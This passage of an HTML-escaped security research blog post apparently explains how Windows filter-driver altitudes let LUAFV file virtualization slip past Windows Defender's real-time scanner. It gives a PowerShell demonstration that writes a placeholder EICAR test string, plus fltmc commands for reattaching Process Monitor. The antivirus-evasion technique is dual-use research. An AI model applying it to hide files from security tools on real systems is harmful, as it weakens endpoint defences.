class="c47" id="h.kum3osj0oza0"&gt;&lt;span class="c5"&gt;Altitude sickness.&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span&gt;Sorry, I couldn&amp;rsquo;t resist the pun. This is a bug class which is caused by the ordering of filter operations based on the assigned altitudes of the driver. For example, if you look at the list of filters from the &lt;/span&gt;&lt;span class="c21"&gt;fltmc&lt;/span&gt;&lt;span&gt;&amp;nbsp;command shown earlier in this blog post you&amp;rsquo;ll notice that &lt;/span&gt;&lt;span class="c21"&gt;WdFilter &lt;/span&gt;&lt;span&gt;which is the real-time scanner for Windows Defender is at a much higher altitude than &lt;/span&gt;&lt;span class="c21"&gt;LUAFV &lt;/span&gt;&lt;span class="c1"&gt;which is the UAC file virtualization driver. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;What this means is if &lt;/span&gt;&lt;span class="c21"&gt;LUAFV &lt;/span&gt;&lt;span&gt;performs some operations, such as calling &lt;/span&gt;&lt;span class="c21"&gt;FltCreateFileEx&lt;/span&gt;&lt;span&gt;&amp;nbsp;which only dispatches the IO request to filters below &lt;/span&gt;&lt;span class="c21"&gt;LUAFV &lt;/span&gt;&lt;span class="c1"&gt;then Windows Defender will miss the file operations and not be able to act on them. Let&amp;rsquo;s show this in action with a simple PowerShell script.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.73914d6ff290dc52f17ef098eb708704aa2582ec"&gt;&lt;/a&gt;&lt;a id="t.22"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c19"&gt;&lt;span class="c17 c57 c23"&gt;function&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c48 c23"&gt;Write-EICAR&lt;/span&gt;&lt;span class="c30 c17 c23"&gt;&amp;nbsp;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17 c57 c23"&gt;param&lt;/span&gt;&lt;span class="c17 c23"&gt;(&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;[&lt;/span&gt;&lt;span class="c17 c23 c79"&gt;string&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;]&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$Path&lt;/span&gt;&lt;span class="c30 c17 c23"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c19 c8"&gt;&lt;span class="c30 c17 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17 c23 c83"&gt;# Replace with a real EICAR string.&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$eicar&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;=&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;[&lt;/span&gt;&lt;span class="c17 c79 c23"&gt;System.Text.Encoding&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;]::&lt;/span&gt;&lt;span class="c17 c23"&gt;ASCII&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;.&lt;/span&gt;&lt;span class="c17 c23"&gt;GetBytes(&lt;/span&gt;&lt;span class="c16"&gt;&amp;quot;&amp;lt;EICAR&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="c30 c17 c23"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Use-NtObject&lt;/span&gt;&lt;span class="c17 c23"&gt;(&lt;/span&gt;&lt;span class="c17 c23 c42"&gt;$f&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;=&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c60 c23"&gt;New-NtFile&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-Win32Path&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$Path&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c23 c45"&gt;-Disposition&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c48 c23"&gt;OpenIf&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-Access&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c48 c23"&gt;ReadData&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;,&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c48 c23"&gt;WriteData&lt;/span&gt;&lt;span class="c30 c17 c23"&gt;) {&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c42 c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $f&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;.&lt;/span&gt;&lt;span class="c17 c23"&gt;Length &lt;/span&gt;&lt;span class="c17 c35 c23"&gt;=&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c43 c23"&gt;0&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Write-NtFile&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$f&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$eicar&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-Offset&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c23 c43"&gt;0&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c30 c17 c23"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c30 c17 c23"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c19 c8"&gt;&lt;span class="c30 c17 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Write-EICAR&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-Path&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;&amp;quot;&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$env:TEMP&lt;/span&gt;&lt;span class="c16 c40"&gt;\eicar.txt&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Enable-NtTokenVirtualization&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Write-EICAR&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-Path&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;&amp;quot;&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$env:windir&lt;/span&gt;&lt;span class="c16"&gt;\system32\license.rtf&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c21"&gt;Write-EICAR&lt;/span&gt;&lt;span&gt;&amp;nbsp;function opens or creates a new file at a specified path, truncates the file to a zero length, writes the EICAR string then closes the file. Note I&amp;rsquo;ve replaced the EICAR string with the dummy &lt;/span&gt;&lt;span class="c21"&gt;&amp;lt;EICAR&amp;gt;&lt;/span&gt;&lt;span class="c1"&gt;. You&amp;rsquo;ll need to look up the real string online and replace it before running the test. I did this to prevent some overzealous AV detecting the EICAR string and quarantining this web page.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;We create an EICAR file in the temporary folder. Once the file has been closed Windows Defender&amp;rsquo;s real-time scanner should scan it and warn the user that it has quarantined the file.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;a href="https://1.bp.blogspot.com/-tLMq6lEXKNM/X_9xluZ7oVI/AAAAAAAAaoc/moryf-kgfIs6Ch3zgrEwPikMez6fqZsQgCNcBGAsYHQ/s462/eicar_quarantine.PNG" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-tLMq6lEXKNM/X_9xluZ7oVI/AAAAAAAAaoc/moryf-kgfIs6Ch3zgrEwPikMez6fqZsQgCNcBGAsYHQ/s462/eicar_quarantine.PNG" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;However, once we enable virtualization using &lt;/span&gt;&lt;span class="c21"&gt;Enable-NtTokenVirtualization&lt;/span&gt;&lt;span&gt;&amp;nbsp;and write to an existing system file the file processing is handled inside the LUAFV driver after &lt;/span&gt;&lt;span class="c21"&gt;WdFilter&lt;/span&gt;&lt;span&gt;&amp;nbsp;has done its checking. Therefore the second command will succeed, although the file which is actually created is in the user&amp;rsquo;s virtual store, we&amp;rsquo;ve not overwritten &lt;/span&gt;&lt;span class="c21"&gt;license.rtf&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;Worth pointing out that this only allows you to create the file on disk. The instant that virtualized file is used by any application Windows Defender will see it and quarantine it. Therefore it provides no real value to bypass Windows Defender&amp;rsquo;s signature checks. However, I think this is an interesting demonstration of the types of issues you could find due to the differing altitudes.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c52 c21"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The mismatch with the filter altitude is also a potential reason you&amp;rsquo;ll miss file events in &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon"&gt;Process Monitor&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Process Monitor&lt;/span&gt;&lt;span&gt;&amp;nbsp;runs its mini-filter to capture file events at altitude 385200 which is above &lt;/span&gt;&lt;span class="c21"&gt;LUAFV&lt;/span&gt;&lt;span&gt;. You will not see most direct virtualization events. However we can do something about this, we can use &lt;/span&gt;&lt;span class="c21"&gt;fltmc &lt;/span&gt;&lt;span class="c1"&gt;to detach the Process Monitor filter from a volume and reattach at a much lower altitude. Start Process Monitor then run the following commands to reattach to the C: drive.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.d9a74de1921758cf3079034ad1a819586deefbc3"&gt;&lt;/a&gt;&lt;a id="t.23"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c17"&gt;C:\&amp;gt; &lt;/span&gt;&lt;span class="c30 c50"&gt;fltmc detach PROCMON24 C:&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c17"&gt;C:\&amp;gt; &lt;/span&gt;&lt;span class="c30 c50"&gt;fltmc attach PROCMON24 C: -i &amp;quot;Process Monitor 24 Instance&amp;quot; -a 100&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;You might need to replace &lt;/span&gt;&lt;span class="c21"&gt;24 &lt;/span&gt;&lt;span&gt;with an appropriate version number for your version of Process Monitor. You should start seeing more events which were previously hidden by &lt;/span&gt;&lt;span class="c21"&gt;LUAFV &lt;/span&gt;&lt;span class="c1"&gt;and other filter drivers at lower altitudes. This should help you monitor file access for any interesting behavior. Sadly even though you can try and attach the Process Monitor filter to the named pipe device it won&amp;rsquo;t work as the driver doesn&amp;rsquo;t indicate support for that device.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c21"&gt;Note, that stopping and starting the Process Monitor capture will reset the volume instances for the filter driver and remove the low altitude instance. If you create the new instance without the instance name (the string after -i) then it won&amp;rsquo;t get deleted, however Process Monitor will show duplicate entries for any IO request which is the same at both altitudes. The Process Monitor driver does not support attaching at a different altitude through any command line options, this would be one of those cases where it&amp;rsquo;d be useful for this tooling to be &lt;/span&gt;&lt;span class="c2 c21"&gt;&lt;a class="c101" href="https://twitter.com/tiraniddo/status/1284139369788563456"&gt;open source&lt;/a&gt;&lt;/span&gt;&lt;span class="c52 c21"&gt;&amp;nbsp;so that this feature could be added.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;As an example before adding the low altitude instance if you create the EICAR test file you&amp;rsquo;ll see the following events:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.5cc59b8216ebb22552ebe7a80f49457d9b8699df"&gt;&lt;/a&gt;&lt;a id="t.24"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c3"&gt;&lt;td class="c38 c69" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c24 c23"&gt;ID&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c68 c69" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c24 c23"&gt;Path&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c65" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c24 c23"&gt;Operation&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34 c69" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c24 c23"&gt;Result&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c39" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c23 c24"&gt;Detail&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c38 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c63" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c78 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CreateFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c58 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Desired Access: Read Data, Write Data&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c33 c38" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c68 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c78 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SetEndOfFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c33 c58" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;EndOfFile: 0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c38 c67" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c67 c68" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Users\admin\AppData\Local\VirtualStore\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c67 c78" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;WriteFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34 c67" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c58 c67" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Offset: 0, Length: 68&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c38" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c68" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Users\admin\AppData\Local\VirtualStore\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c78" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CloseFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c58" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;I&amp;rsquo;ve added an ID column which indicates the event taking place. The events match the code for creating the EICAR file, we open the file for read and write access, set the length to 0, write the EICAR string and then close the file. Note that in event ID 2 the path to the file has changed from the original one in system32 to the virtual store. This is because the file is &amp;ldquo;delay virtualized&amp;rdquo; so it&amp;rsquo;ll only be created if a write IO request, such as changing the file length, is dispatched to the file.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;Now let&amp;rsquo;s compare the events when the altitude is set to 100:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.0d6396351a2232cf22def463e5b7da75b343156e"&gt;&lt;/a&gt;&lt;a id="t.25"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c69" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c24 c23"&gt;ID&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c69" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c24 c23"&gt;Path&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c69 c72" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c24 c23"&gt;Operation&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c69" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c24 c23"&gt;Result&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c41 c69" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c24 c23"&gt;Detail&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c85"&gt;&lt;td class="c46" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c72 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CreateFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;ACCESS DENIED&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c41 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Desired Access: Read Data, Write Data&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c46" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c72 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CreateFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c41 c64" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Desired Access: Read Data&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CreateFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c18" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Desired Access: Read Data, Read Attributes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c23 c25"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Users\admin\AppData\Local\VirtualStore\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CreateFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c18" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Desired Access: Write Data, Write Attributes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Users\admin\AppData\Local\VirtualStore\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SetEndOfFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c18" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;EndOfFile: 538&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;ReadFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c18" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Offset: 0, Length: 538&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 